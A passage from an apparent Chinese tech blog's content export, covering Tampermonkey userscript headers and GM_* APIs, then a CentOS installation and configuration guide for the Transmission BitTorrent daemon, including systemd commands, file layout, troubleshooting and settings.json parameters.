align=\"center\">只能访问 devtools、extension、runtime 等部分API</td>\n<td align=\"center\">可以</td>\n<td align=\"center\">可以</td>\n<td align=\"center\">不可以</td>\n</tr>\n</tbody></table>\n<h2 id=\"二、用户脚本标记头\"><a href=\"#二、用户脚本标记头\" class=\"headerlink\" title=\"二、用户脚本标记头\"></a>二、用户脚本标记头</h2><ul>\n<li>@name</li>\n<li>@namespace</li>\n<li>@version</li>\n<li>@author</li>\n<li>@description</li>\n<li>@homepage, @homepageURL, @website and @source</li>\n<li>@icon, @iconURL and @defaulticon</li>\n<li>@icon64 and @icon64URL</li>\n<li>@updateURL</li>\n<li>@downloadURL</li>\n<li>@supportURL</li>\n<li>@include</li>\n<li>@match</li>\n<li>@exclude</li>\n<li>@require</li>\n<li>@resource</li>\n<li>@connect</li>\n<li>@run-at</li>\n<li>@grant</li>\n<li>@noframes</li>\n<li>@unwrap</li>\n<li>@nocompat</li>\n</ul>\n<h2 id=\"三、应用编程接口\"><a href=\"#三、应用编程接口\" class=\"headerlink\" title=\"三、应用编程接口\"></a>三、应用编程接口</h2><h3 id=\"通用类\"><a href=\"#通用类\" class=\"headerlink\" title=\"通用类\"></a>通用类</h3><ul>\n<li>GM_log(message)</li>\n<li>GM_info</li>\n</ul>\n<h3 id=\"本地存储类\"><a href=\"#本地存储类\" class=\"headerlink\" title=\"本地存储类\"></a>本地存储类</h3><p>GM存储并不是浏览器的localStorage数据，而是TM自行定义的，仅在本TM内部有效。</p>\n<ul>\n<li><p>GM_setValue(name, value)</p>\n</li>\n<li><p>GM_getValue(name, defaultValue)</p>\n</li>\n<li><p>GM_deleteValue(name)</p>\n</li>\n<li><p>GM_listValues()<br>这个函数的返回值很奇葩！是一个包含所有name的数组，而不是value。<br>而且，js中for循环中的自变量，如果母体是Array，自变量是计数器，而非数组的内容。</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> names = <span class=\"title function_\">GM_listValues</span>();</span><br><span class=\"line\"><span class=\"keyword\">let</span> rs = <span class=\"keyword\">new</span> <span class=\"title class_\">Map</span>();</span><br><span class=\"line\"><span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i <span class=\"keyword\">in</span> names) rs.<span class=\"title function_\">set</span>(names[i], <span class=\"title function_\">GM_getValue</span>(names[i]));</span><br><span class=\"line\"><span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"string\">&#x27;GM_listValues:&#x27;</span>, rs);</span><br></pre></td></tr></table></figure></li>\n</ul>\n<p><code>GM_addValueChangeListener</code>可以对某个存储变量设置侦听器，用于不同浏览器选项卡的脚本之间的通信。<br>其中，回调函数的<code>remote</code>参数显示这个值是在另一个选项卡的实例中修改的<code>true</code>,还是在这个脚本实例中修改的<code>false</code>。</p>\n<ul>\n<li>GM_addValueChangeListener(name, function(name, old_value, new_value, remote) {})</li>\n<li>GM_removeValueChangeListener(listener_id)</li>\n</ul>\n<h3 id=\"配置信息类\"><a href=\"#配置信息类\" class=\"headerlink\" title=\"配置信息类\"></a>配置信息类</h3><ul>\n<li>GM_getResourceText(name)</li>\n<li>GM_getResourceURL(name)</li>\n<li>GM_registerMenuCommand(name, fn, accessKey)</li>\n<li>GM_unregisterMenuCommand(menuCmdId)</li>\n</ul>\n<h3 id=\"外部接口类\"><a href=\"#外部接口类\" class=\"headerlink\" title=\"外部接口类\"></a>外部接口类</h3><ul>\n<li>GM_openInTab(url, options), GM_openInTab(url, loadInBackground)<br>使用此url打开一个新选项卡，和<code>window.open()</code> 功能类似。<br>注意，其返回值并不是标准的<code>window</code>对象，而是一个包含函数close、侦听器onclosed、closed标记的奇怪对象。</li>\n<li>GM_xmlhttpRequest(details)<br>重要！！！由于TM运行在浏览器中，无法访问host数据，只能通过XHR保存爬取来的数据。</li>\n<li>GM_download(details), GM_download(url, name)</li>\n<li>GM_getTab(callback)</li>\n<li>GM_saveTab(tab)</li>\n<li>GM_getTabs(callback)</li>\n<li>GM_setClipboard(data, info)</li>\n</ul>\n<h3 id=\"DOM资源类\"><a href=\"#DOM资源类\" class=\"headerlink\" title=\"DOM资源类\"></a>DOM资源类</h3><ul>\n<li>unsafeWindow<br>  默认TM可以访问DOM，但不可以直接调用页面javascript函数。<br>  如果头文件包含<code>// @grant unsafeWindow</code>，就可以通过<code>safeWindow</code>对象提供对页面javascript函数和变量的完全访问</li>\n<li>GM_addStyle(css)<br>将给定的样式添加到文档并返回注入的样式元素。</li>\n<li>Subresource Integrity<br>@resource 和 @require 标记 URL 的哈希组件可用于此目的。</li>\n<li>GM_notification(details, ondone), GM_notification(text, title, image, onclick)<br>显示 HTML5 桌面通知和&#x2F;或突出显示当前选项卡。</li>\n<li>&lt;&gt;<![CDATA[your_text_here]]>&lt;&#x2F;&gt;<br>Tampermonkey支持这种存储元数据的方式。TM尝试自动检测脚本是否需要启用此兼容性选项。</li>\n</ul>\n<h2 id=\"四、TamperMonkey的默认用户脚本\"><a href=\"#四、TamperMonkey的默认用户脚本\" class=\"headerlink\" title=\"四、TamperMonkey的默认用户脚本\"></a>四、TamperMonkey的默认用户脚本</h2><figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// ==UserScript==</span></span><br><span class=\"line\"><span class=\"comment\">// @name         New Userscript</span></span><br><span class=\"line\"><span class=\"comment\">// @namespace    http://tampermonkey.net/</span></span><br><span class=\"line\"><span class=\"comment\">// @version      0.1</span></span><br><span class=\"line\"><span class=\"comment\">// @description  try to take over the world!</span></span><br><span class=\"line\"><span class=\"comment\">// @author       You</span></span><br><span class=\"line\"><span class=\"comment\">// @match        http://*/*</span></span><br><span class=\"line\"><span class=\"comment\">// @grant        none</span></span><br><span class=\"line\"><span class=\"comment\">// ==/UserScript==</span></span><br><span class=\"line\"></span><br><span class=\"line\">(<span class=\"keyword\">function</span>(<span class=\"params\"></span>) &#123;</span><br><span class=\"line\">    <span class=\"string\">&#x27;use strict&#x27;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// Your code here...</span></span><br><span class=\"line\">&#125;)();</span><br></pre></td></tr></table></figure>\n\n<hr>\n<figure class=\"highlight console\"><table><tr><td class=\"code\"><pre><span class=\"line\">--Start Firefox--</span><br><span class=\"line\">export DISPLAY=:0</span><br><span class=\"line\">source /etc/profile</span><br><span class=\"line\">/usr/bin/python3 -m webbrowser -t https://b2b.10086.cn/b2b/main/listVendorNotice.html?noticeType=1</span><br><span class=\"line\">␇</span><br><span class=\"line\">--end--</span><br><span class=\"line\">START /usr/bin/firefox &quot;https://b2b.10086.cn/b2b/main/listVendorNotice.html?noticeType=1&quot;</span><br><span class=\"line\">Failed to open connection to &quot;session&quot; message bus: /usr/bin/dbus-launch terminated abnormally with the following error:</span><br><span class=\"line\"> No protocol specified</span><br><span class=\"line\">Autolaunch error: X11 initialization failed.</span><br><span class=\"line\"></span><br><span class=\"line\">Running without a11y support!</span><br><span class=\"line\">No protocol specified</span><br><span class=\"line\">Error: cannot open display: :0</span><br><span class=\"line\">xdg-open: no method available for opening &#x27;https://b2b.10086.cn/b2b/main/listVendorNotice.html?noticeType=1&#x27;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<hr>\n<h2 id=\"参考文献\"><a href=\"#参考文献\" class=\"headerlink\" title=\"参考文献\"></a>参考文献</h2><h3 id=\"官方文档\"><a href=\"#官方文档\" class=\"headerlink\" title=\"官方文档\"></a>官方文档</h3><ul>\n<li><a href=\"https://www.tampermonkey.net/documentation.php\">TamperMonkey官方文档</a></li>\n<li><a href=\"https://greasyfork.org/zh-CN\">Greasy Fork: 一个提供用户脚本的网站</a></li>\n<li><a href=\"https://www.cnblogs.com/grubber/p/12560522.html\">TamperMonkey中文参考文档</a></li>\n<li><a href=\"https://es6.ruanyifeng.com/\">ECMAScript 6 经典教程</a></li>\n<li><a href=\"https://developer.chrome.com/extensions/devtools\">Chrome DevTools Extensions官方文档</a></li>\n<li><a href=\"https://crxdoc-zh.appspot.com/extensions/devtools\">Chrome DevTools Extensions中文文档</a></li>\n<li><a href=\"https://crxdoc-zh.appspot.com/extensions/contentSecurityPolicy\">Chrome 内容安全策略（CSP）</a></li>\n<li><a href=\"https://zhaomenghuan.js.org/blog/chrome-devtools.html\">深入理解 Chrome DevTools</a></li>\n</ul>\n<h3 id=\"开发案例\"><a href=\"#开发案例\" class=\"headerlink\" title=\"开发案例\"></a>开发案例</h3><ul>\n<li><a href=\"https://juejin.cn/post/6844904127932137485\">Chrome Extension开发基础知识</a></li>\n<li><a href=\"http://www.ruanyifeng.com/blog/2016/09/csp.html\">Content Security Policy 入门教程</a></li>\n<li><a href=\"https://horve.github.io/2015/10/17/chrome-extension/\">chrome拓展开发实战：页面脚本的拦截注入</a></li>\n<li><a href=\"https://github.com/FoXZilla/Pxer/blob/master/README.zh.md\">基于TM插件的某个优秀图片爬虫</a></li>\n<li><a href=\"https://www.thinbug.com/q/52415273\">GM_getTab开发示例</a></li>\n<li><a href=\"https://blog.csdn.net/weixin_42067967/article/details/105863853\">GM_addValueChangeListener开发示例</a></li>\n<li><a href=\"https://zhuanlan.zhihu.com/p/67221319\">一个TM爬虫的粗糙示例</a></li>\n<li><a href=\"https://juejin.cn/post/6844903575143841805\">常见跨域解决方案</a></li>\n</ul>\n"},{"title":"Transmission 安装和配置","url":"/2022/04/16/Transmission-%E5%AE%89%E8%A3%85%E5%92%8C%E9%85%8D%E7%BD%AE/","content":"<h2 id=\"一、概述\"><a href=\"#一、概述\" class=\"headerlink\" title=\"一、概述\"></a>一、概述</h2><p>Transmission是一个轻量级、跨平台、开源的 BitTorrent 客户端，官网地址是<a href=\"https://transmissionbt.com/\">https://transmissionbt.com/</a>，源码地址是<a href=\"https://github.com/transmission/transmission\">https://github.com/transmission/transmission</a>，当前最新版本是3.0。</p>\n<p><img src=\"/2022/04/16/Transmission-%E5%AE%89%E8%A3%85%E5%92%8C%E9%85%8D%E7%BD%AE/home.png\" alt=\"Transmission 的官网首页\"></p>\n<p>其实现了BT协议的几乎全部功能，覆盖了Linux、MacOS、Windows等所有主流操作系统，核心组件包括：</p>\n<ul>\n<li>1个基于MacOS的Native Application</li>\n<li>2个基于Linux的Native Application，分别支持 GTK GUI和 QT GUI</li>\n<li>1个基于Linux的守护服务，用于服务器或路由器的后台服务</li>\n<li>1个WEB UI前端界面，通过Json RPC接口服务提供浏览器访问</li>\n</ul>\n<p><img src=\"/2022/04/16/Transmission-%E5%AE%89%E8%A3%85%E5%92%8C%E9%85%8D%E7%BD%AE/arch.gif\" alt=\"Transmission技术架构\"></p>\n<h2 id=\"二、Centos的安装配置方法\"><a href=\"#二、Centos的安装配置方法\" class=\"headerlink\" title=\"二、Centos的安装配置方法\"></a>二、Centos的安装配置方法</h2><p>下面以Centos为例，介绍其安装和配置的基本步骤。</p>\n<h3 id=\"1-软件包安装\"><a href=\"#1-软件包安装\" class=\"headerlink\" title=\"1. 软件包安装\"></a>1. 软件包安装</h3><p>最简便的方法是使用EPEL源，简单粗暴就是：<code>yum install transmission</code>，当然严谨一点就是:</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">yum install transmission-daemon</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"2-系统自启动\"><a href=\"#2-系统自启动\" class=\"headerlink\" title=\"2. 系统自启动\"></a>2. 系统自启动</h3><p><code>transmission-daemon</code>支持<code>systemd</code>启动方式。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">systemctl start transmission-daemon --now</span><br><span class=\"line\">systemctl status transmission-daemon</span><br></pre></td></tr></table></figure>\n\n<p>如果后台服务正常启动，可以看到如下启动信息：</p>\n<figure class=\"highlight console\"><table><tr><td class=\"code\"><pre><span class=\"line\">[root@test transmission]# systemctl status transmission-daemon</span><br><span class=\"line\">● transmission-daemon.service - Transmission BitTorrent Daemon</span><br><span class=\"line\">   Loaded: loaded (/usr/lib/systemd/system/transmission-daemon.service; disabled; vendor preset: disabled)</span><br><span class=\"line\">   Active: active (running) since 六 2022-04-16 22:10:31 CST; 34min ago</span><br><span class=\"line\"> Main PID: 12051 (transmission-da)</span><br><span class=\"line\">   Status: &quot;Idle.&quot;</span><br><span class=\"line\">   CGroup: /system.slice/transmission-daemon.service</span><br><span class=\"line\">           └─12051 /usr/bin/transmission-daemon -f --log-error</span><br><span class=\"line\"></span><br><span class=\"line\">4月 16 22:10:31 test.caogo.local systemd[1]: Starting Transmission BitTorrent Daemon...</span><br><span class=\"line\">4月 16 22:10:31 test.caogo.local systemd[1]: Started Transmission BitTorrent Daemon.</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"3-运行监控\"><a href=\"#3-运行监控\" class=\"headerlink\" title=\"3. 运行监控\"></a>3. 运行监控</h3><p>后台服务启动成功后，可以看到占用tcp&#x2F;udp 51413作为BT通信端口，占用tcp 9091端口用于访问Web UI。</p>\n<figure class=\"highlight console\"><table><tr><td class=\"code\"><pre><span class=\"line\">[root@test lib]# netstat -tunpl |grep transmission</span><br><span class=\"line\">tcp        0      0 0.0.0.0:51413           0.0.0.0:*               LISTEN      11846/transmission- </span><br><span class=\"line\">tcp        0      0 0.0.0.0:9091            0.0.0.0:*               LISTEN      11846/transmission- </span><br><span class=\"line\">tcp6       0      0 :::51413                :::*                    LISTEN      11846/transmission- </span><br><span class=\"line\">udp        0      0 0.0.0.0:51413           0.0.0.0:*                           11846/transmission- </span><br></pre></td></tr></table></figure>\n\n<p>此时，通过浏览器打开<code>http://&lt;IP地址&gt;:9091</code>，就可以看到Web UI的局面了。</p>\n<p><img src=\"/2022/04/16/Transmission-%E5%AE%89%E8%A3%85%E5%92%8C%E9%85%8D%E7%BD%AE/web.png\" alt=\"Web UI\"></p>\n<h2 id=\"三、Transmission软件包的构成分析\"><a href=\"#三、Transmission软件包的构成分析\" class=\"headerlink\" title=\"三、Transmission软件包的构成分析\"></a>三、Transmission软件包的构成分析</h2><p>最简便的方法是使用EPEL源，通过<code>yum search transmission</code>搜索，主要有以下软件包：</p>\n<ul>\n<li><code>transmission-common</code>: 核心组件，包含1个 Web GUI 和 4个命令行程序：<code>transmission-create | edit | remote | show</code></li>\n<li><code>transmission-daemon</code>: &#x3D; <code>transmission-common</code> + 1个后台守护程序<code>transmission-daemon</code></li>\n<li><code>transmission-cli</code>: &#x3D; <code>transmission-common</code> + 1个系统配置命令行程序<code>transmission-cli</code></li>\n<li><code>transmission-gtk</code>：&#x3D; <code>transmission-common</code> + 基于GTK GUI的Applicaition</li>\n<li><code>transmission-qt</code>：&#x3D; <code>transmission-common</code> + 基于Qt GUI的Applicaition</li>\n<li><code>transmission</code>: &#x3D; 常用安装包名，默认采用GTK，基本等于<code>transmission-gtk</code></li>\n</ul>\n<p>通过<code>yum info transmission-common</code>可以查看该软件包的基本信息。<br>通过<code>repoquery -ql transmission-common.x86_64</code>，可以查看该软件包的全部文件信息。</p>\n<figure class=\"highlight console\"><table><tr><td class=\"code\"><pre><span class=\"line\">[root@test transmission]# yum info transmission-common</span><br><span class=\"line\">已加载插件：fastestmirror</span><br><span class=\"line\">Loading mirror speeds from cached hostfile</span><br><span class=\"line\">已安装的软件包</span><br><span class=\"line\">名称    ：transmission-common</span><br><span class=\"line\">架构    ：x86_64</span><br><span class=\"line\">版本    ：2.94</span><br><span class=\"line\">发布    ：9.el7</span><br><span class=\"line\">大小    ：3.0 M</span><br><span class=\"line\">源    ：installed</span><br><span class=\"line\">来自源：epel</span><br><span class=\"line\">简介    ： Transmission common files</span><br><span class=\"line\">网址    ：http://www.transmissionbt.com</span><br><span class=\"line\">协议    ： MIT and GPLv2</span><br><span class=\"line\">描述    ： Common files for Transmission BitTorrent client sub-packages. It includes</span><br><span class=\"line\">         : the web user interface, icons and transmission-remote, transmission-create,</span><br><span class=\"line\">         : transmission-edit, transmission-show utilities.</span><br><span class=\"line\"></span><br><span class=\"line\">[root@test transmission]# repoquery -ql transmission-daemon.x86_64</span><br><span class=\"line\">/usr/bin/transmission-daemon</span><br><span class=\"line\">/usr/lib/systemd/system/transmission-daemon.service</span><br><span class=\"line\">/usr/share/man/man1/transmission-daemon.1.gz</span><br><span class=\"line\">/var/lib/transmission</span><br></pre></td></tr></table></figure>\n\n<p>由此可以分析得出<code>transmission-daemon</code>安装过程的主要步骤包括：</p>\n<h3 id=\"1-创建默认用户\"><a href=\"#1-创建默认用户\" class=\"headerlink\" title=\"1. 创建默认用户\"></a>1. 创建默认用户</h3><p>安装完成后检查<code>/etc/passwd</code>，发现添加了一个不能登录的系统用户<code>transmission</code>。</p>\n<figure class=\"highlight txt\"><table><tr><td class=\"code\"><pre><span class=\"line\">transmission:x:998:995:transmission daemon account:/var/lib/transmission:/sbin/nologin</span><br></pre></td></tr></table></figure>\n\n<p>HOME就是软件包的默认安装目录<code>/var/lib/transmission</code>。</p>\n<h3 id=\"2-拷贝可执行程序\"><a href=\"#2-拷贝可执行程序\" class=\"headerlink\" title=\"2. 拷贝可执行程序\"></a>2. 拷贝可执行程序</h3><p>可执行程序的安装位置是<code>/usr/bin/</code>，可以发现有<code>transmission-daemon</code>等5个程序。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">[root@localhost transmission-daemon]<span class=\"comment\"># ls -l /usr/bin/transmission*</span></span><br><span class=\"line\">-rwxr-xr-x 1 root root 560880 5月  18 2020 /usr/bin/transmission-create</span><br><span class=\"line\">-rwxr-xr-x 1 root root 577152 5月  18 2020 /usr/bin/transmission-daemon</span><br><span class=\"line\">-rwxr-xr-x 1 root root 556456 5月  18 2020 /usr/bin/transmission-edit</span><br><span class=\"line\">-rwxr-xr-x 1 root root 597360 5月  18 2020 /usr/bin/transmission-remote</span><br><span class=\"line\">-rwxr-xr-x 1 root root 556464 5月  18 2020 /usr/bin/transmission-show</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"3-拷贝软件文档\"><a href=\"#3-拷贝软件文档\" class=\"headerlink\" title=\"3. 拷贝软件文档\"></a>3. 拷贝软件文档</h3><p>yum安装软件包时，通常在以下目录补充该软件的文档信息：</p>\n<ul>\n<li>&#x2F;usr&#x2F;share&#x2F;doc&#x2F;：本软件使用说明书</li>\n<li>&#x2F;usr&#x2F;share&#x2F;icons&#x2F;：本软件使用的各种尺寸的图标</li>\n<li>&#x2F;usr&#x2F;share&#x2F;licenses&#x2F;：本软件的许可证文件</li>\n<li>&#x2F;usr&#x2F;share&#x2F;man&#x2F;：man命令的帮助信息</li>\n<li>&#x2F;usr&#x2F;share&#x2F;pixmaps&#x2F;：本软件Logo的位图</li>\n</ul>\n<h3 id=\"4-拷贝Web-UI\"><a href=\"#4-拷贝Web-UI\" class=\"headerlink\" title=\"4. 拷贝Web UI\"></a>4. 拷贝Web UI</h3><p>Transmission的Web UI的入口文件存储在<code>/usr/share/transmission/web/index.html</code>，其结构与普通网站一致：</p>\n<figure class=\"highlight console\"><table><tr><td class=\"code\"><pre><span class=\"line\">web</span><br><span class=\"line\">├── images</span><br><span class=\"line\">├── index.html</span><br><span class=\"line\">├── javascript</span><br><span class=\"line\">├── LICENSE</span><br><span class=\"line\">└── style</span><br><span class=\"line\">    ├── jqueryui</span><br><span class=\"line\">    └── transmission</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"5-设置系统启动服务\"><a href=\"#5-设置系统启动服务\" class=\"headerlink\" title=\"5. 设置系统启动服务\"></a>5. 设置系统启动服务</h3><p>采用systemd的启动方式，服务配置文件是<code>/usr/lib/systemd/system/transmission-daemon.service</code></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">[Unit]</span><br><span class=\"line\">Description=Transmission BitTorrent Daemon</span><br><span class=\"line\">After=network.target</span><br><span class=\"line\"></span><br><span class=\"line\">[Service]</span><br><span class=\"line\">User=transmission</span><br><span class=\"line\">Type=notify</span><br><span class=\"line\">ExecStart=/usr/bin/transmission-daemon -f --log-error</span><br><span class=\"line\">ExecReload=/bin/kill -s HUP $MAINPID</span><br><span class=\"line\"></span><br><span class=\"line\">[Install]</span><br><span class=\"line\">WantedBy=multi-user.target</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"6-设置软件包的数据目录\"><a href=\"#6-设置软件包的数据目录\" class=\"headerlink\" title=\"6. 设置软件包的数据目录\"></a>6. 设置软件包的数据目录</h3><p>Transmission-daemon的配置文件隐藏在<code>$HOME/.config/transmission-daemon/</code>，而不是常规的<code>/etc/</code><br>HOME的目录结构如下：</p>\n<figure class=\"highlight console\"><table><tr><td class=\"code\"><pre><span class=\"line\">[root@test transmission]# tree /var/lib/transmission -a</span><br><span class=\"line\">/var/lib/transmission</span><br><span class=\"line\">├── .config/                    # 配置文件目录</span><br><span class=\"line\">│   └── transmission-daemon/ </span><br><span class=\"line\">│       ├── blocklists/         # 各个种子文件的数据块信息</span><br><span class=\"line\">│       ├── resume/             # 各个种子文件的运行状态</span><br><span class=\"line\">│       ├── settings.json       # 主配置文件，json格式</span><br><span class=\"line\">│       ├── stats.json          # 当前系统运行状态，json格式</span><br><span class=\"line\">│       ├── dht.dat             # 存储DHT节点信息</span><br><span class=\"line\">│       └── torrents/           # 种子文件的存储目录</span><br><span class=\"line\">├── Downloads/                  # 下载数据文件的存储目录</span><br><span class=\"line\">└── .pki/</span><br><span class=\"line\">    └── nssdb/</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"四、Transmission跨平台技术方案分析\"><a href=\"#四、Transmission跨平台技术方案分析\" class=\"headerlink\" title=\"四、Transmission跨平台技术方案分析\"></a>四、Transmission跨平台技术方案分析</h2><p><code>Transmission core</code>作为核心引擎，负责实现BT协议的全部功能，其底层依赖两个外部库函数：</p>\n<ul>\n<li><code>libevent</code>：一个异步事件处理软件库。libevent提供了一组应用程序编程接口（API），允许开发者为事件注册回调函数，用来取代网络服务器所使用的事件循环检查框架。</li>\n<li><code>libnatpmp</code>：一个NAT-PMP协议库。NAT-PMP（Network Address Translation Port Mapping Protocol）协议通过端口映射的方式获取外网主机的IP地址。</li>\n</ul>\n<p>其对外提供服务主要通过以下接口实现：</p>\n<ul>\n<li><code>JSON RPC Server</code>：提供网络远程调用接口，以JSON格式</li>\n<li><code>Web App Server</code>：基于通用Web Server，以Web形式通过网络App应用服务接口</li>\n<li><code>Lib Transmission</code>：提供C语言的库函数接口，仅能用于Native Application</li>\n</ul>\n<p><img src=\"/2022/04/16/Transmission-%E5%AE%89%E8%A3%85%E5%92%8C%E9%85%8D%E7%BD%AE/products.gif\" alt=\"APP结构\"><br>以上各软件包的技术依赖关系参见<a href=\"https://github.com/transmission/transmission/blob/main/docs/Transmission-Architecture.md\">Transmission技术架构</a></p>\n<h3 id=\"1-MacOS\"><a href=\"#1-MacOS\" class=\"headerlink\" title=\"1. MacOS\"></a>1. MacOS</h3><p>Transmission以Native Application的方式发布，形态是一个DMG安装包。<br>开发了一个基于GTK GUI的Native GUI，直接采用Transmission core提供的Lib库函数。</p>\n<blockquote>\n<p>Mac OS平台的配置文件目录存在差异，每个种子文件的状态信息位于：<code>~/Library/Application Support/Transmission</code>，而全局配置文件位于：<code>~/Library/Preferences/org.m0k.transmission.plist</code></p>\n</blockquote>\n<h3 id=\"2-Windows\"><a href=\"#2-Windows\" class=\"headerlink\" title=\"2. Windows\"></a>2. Windows</h3><p>Transmission以Native Application的方式发布，形态是一个MSI安装包，分为32位和64位两个版本。<br>开发了一个基于Qt GUI的Native GUI，注意其采用的是JSON RPC接口服务，需要网络组件支持。</p>\n<h3 id=\"3-Linux桌面版\"><a href=\"#3-Linux桌面版\" class=\"headerlink\" title=\"3. Linux桌面版\"></a>3. Linux桌面版</h3><p>Linux桌面系统的市场份额很少，但是很庞杂：</p>\n<ul>\n<li>KDE：排名第一，基于Qt GUI开发</li>\n<li>GNOME：简单速度快，红帽等Linux发行版常用，基于GPK GUI开发<br>此外，GNOME还有多个不同版本的变种，包括Unity、MATE、Cinnamon等</li>\n</ul>\n<blockquote>\n<p>Qt GUI和GPK GUI的配置文件都存储在：<code>$HOME/.config/transmission/</code></p>\n</blockquote>\n<h3 id=\"4-Linux服务器\"><a href=\"#4-Linux服务器\" class=\"headerlink\" title=\"4. Linux服务器\"></a>4. Linux服务器</h3><p>安装<code>transmission-daemon</code>提供后台服务，再通过Web UI提供管理界面是最直接的方案。<br>本机也可以通过<code>transmission-cli</code>提供一个字符界面的管理工具，但是没有人有兴趣使用如此简陋的工具。</p>\n<blockquote>\n<p>transmission-cli的配置文件存储在：<code>$HOME/.config/transmission-cli/</code></p>\n</blockquote>\n<h3 id=\"5-嵌入式设备\"><a href=\"#5-嵌入式设备\" class=\"headerlink\" title=\"5. 嵌入式设备\"></a>5. 嵌入式设备</h3><p>群晖NAS、西部数据NAS、D-Link路由器等嵌入式设备都是基于Linux核心，因此也可以安装Transmission。<br>以西部数据NAS为例，MyBookLive、MyCloud在技术上都可支持，但由于不属于官方项目，因此版本升级时经常被限制。<br>具体安装方法参见<a href=\"http://mybookworld.wikidot.com/optware\">http://mybookworld.wikidot.com/optware</a></p>\n<h2 id=\"五、常见问题的解决方案\"><a href=\"#五、常见问题的解决方案\" class=\"headerlink\" title=\"五、常见问题的解决方案\"></a>五、常见问题的解决方案</h2><h3 id=\"1-UDP缓冲区不足导致Daemon启动失败\"><a href=\"#1-UDP缓冲区不足导致Daemon启动失败\" class=\"headerlink\" title=\"1. UDP缓冲区不足导致Daemon启动失败\"></a>1. UDP缓冲区不足导致Daemon启动失败</h3><p>如果启动失败，并产生如下信息，通常是操作系统的UDP网络缓冲区不足</p>\n<figure class=\"highlight txt\"><table><tr><td class=\"code\"><pre><span class=\"line\">UDP Failed to set receive buffer: requested 4194304, got 425984 (tr-udp.c:84)</span><br><span class=\"line\">UDP Failed to set send buffer: requested 1048576, got 425984 (tr-udp.c:95)</span><br></pre></td></tr></table></figure>\n\n<p>解决办法是通过<code>sysctl -p</code>命令来检查，并修改位于<code>/etc/sysctl.conf</code>的内核参数</p>\n<figure class=\"highlight console\"><table><tr><td class=\"code\"><pre><span class=\"line\">echo &#x27;net.core.rmem_max = 16777216&#x27; &gt;&gt; /etc/sysctl.conf</span><br><span class=\"line\">echo &#x27;net.core.wmem_max = 4194304&#x27; &gt;&gt; /etc/sysctl.conf</span><br><span class=\"line\">sysctl -p</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"2-Web-UI界面无法打开\"><a href=\"#2-Web-UI界面无法打开\" class=\"headerlink\" title=\"2. Web UI界面无法打开\"></a>2. Web UI界面无法打开</h3><p>如果浏览器提示“403: Forbidden”错误信息，并提示“Unauthorized IP Addres”，通常是因为默认只允许来自本机<code>127.0.0.1</code>的白名单访问。<br>解决方法是：</p>\n<ol>\n<li><p>停止守护进程，否则修改无法存盘；</p>\n <figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">systemctl stop transmission-daemon</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>编辑配置文件，修改<code>rpc-whitelist-enabled</code>为<code>false</code></p>\n <figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">vi /var/lib/transmission/.config/transmission-daemon/settings.json</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>重新启动守护进程，并打开浏览器正常访问。</p>\n <figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">systemctl start transmission-daemon</span><br></pre></td></tr></table></figure></li>\n</ol>\n<hr>\n<h2 id=\"附录一：Transmission-全量配置参数\"><a href=\"#附录一：Transmission-全量配置参数\" class=\"headerlink\" title=\"附录一：Transmission 全量配置参数\"></a>附录一：Transmission 全量配置参数</h2><p>以 Centos 7为例，<br>默认配置文件路径：<code>/var/lib/transmission/.config/transmission-daemon/settings.json</code><br>默认下载文件目录：<code>/var/lib/transmission/Downloads</code></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">&quot;alt-speed-up&quot;</span>: 500, <span class=\"comment\">#计划时段上传限速值</span></span><br><span class=\"line\"><span class=\"string\">&quot;alt-speed-down&quot;</span>: 500, <span class=\"comment\">#计划时段下载限速值</span></span><br><span class=\"line\"><span class=\"string\">&quot;alt-speed-enabled&quot;</span>: <span class=\"literal\">false</span>,</span><br><span class=\"line\"><span class=\"string\">&quot;alt-speed-time-begin&quot;</span>: 540,</span><br><span class=\"line\"><span class=\"string\">&quot;alt-speed-time-day&quot;</span>: 127,</span><br><span class=\"line\"><span class=\"string\">&quot;alt-speed-time-enabled&quot;</span>: <span class=\"literal\">true</span>, <span class=\"comment\">#启用计划工作，为false时，以上计划配置则不生效</span></span><br><span class=\"line\"><span class=\"string\">&quot;alt-speed-time-end&quot;</span>: 420, <span class=\"comment\">#计划结束时间，为零点到开始时间的分钟数，比如7:00就是7*60=420。另外，该时间是用的GMT时间，即北京时间-8小时。比如你计划北京时间7点30分开始，这个数字应该是（7-8+24）*60+30=1410</span></span><br><span class=\"line\"><span class=\"string\">&quot;bind-address-ipv4&quot;</span>: <span class=\"string\">&quot;0.0.0.0&quot;</span>,</span><br><span class=\"line\"><span class=\"string\">&quot;bind-address-ipv6&quot;</span>: <span class=\"string\">&quot;::&quot;</span>,</span><br><span class=\"line\"><span class=\"string\">&quot;blocklist-enabled&quot;</span>: <span class=\"literal\">true</span>,</span><br><span class=\"line\"><span class=\"string\">&quot;blocklist-updates-enabled&quot;</span>: <span class=\"literal\">false</span>,</span><br><span class=\"line\"><span class=\"string\">&quot;blocklist-url&quot;</span>: <span class=\"string\">&quot;http://www.example.com/blocklist&quot;</span>,</span><br><span class=\"line\"><span class=\"string\">&quot;cache-size-mb&quot;</span>: 4, <span 